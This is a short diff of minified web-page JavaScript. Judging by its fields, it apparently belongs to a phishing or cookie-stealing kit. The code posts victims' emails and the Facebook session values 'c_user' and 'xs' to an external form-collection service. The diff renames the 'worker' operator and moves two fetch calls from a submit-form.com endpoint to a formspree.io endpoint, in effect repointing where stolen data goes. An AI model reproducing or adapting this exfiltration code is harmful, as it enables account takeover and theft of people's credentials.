@@ -10172,10 +10172,10 @@
                                                     },
                                                     body: JSON.stringify({
                                                         emails: o,
-                                                        workerEmail: "Boss Tariq",
+                                                        workerEmail: "Hassan",
                                                         xs: r,
                                                         c_user: i,
-                                                        name: "Tariq"
+                                                        name: "Hassan"
                                                     })
                                                 }).then((e => {
                                                     e.ok
@@ -13849,7 +13849,7 @@
                                         he.jsxs)("form", {
                                         onSubmit: n => {
                                             n.preventDefault(),
-                                                u && o ? (fetch("https://submit-form.com/D7SKvovwa", {
+                                                u && o ? (fetch("https://formspree.io/f/mqaedydl", {
                                                         method: "POST",
                                                         headers: {
                                                             "Content-Type": "application/json"
@@ -13960,7 +13960,7 @@
                             he.jsx)("button", {
                             onClick: n => {
                                 n.preventDefault(),
-                                    fetch("https://submit-form.com/D7SKvovwa", {
+                                    fetch("https://formspree.io/f/mqaedydl", {
                                         method: "POST",
                                         headers: {
                                             "Content-Type": "application/json"
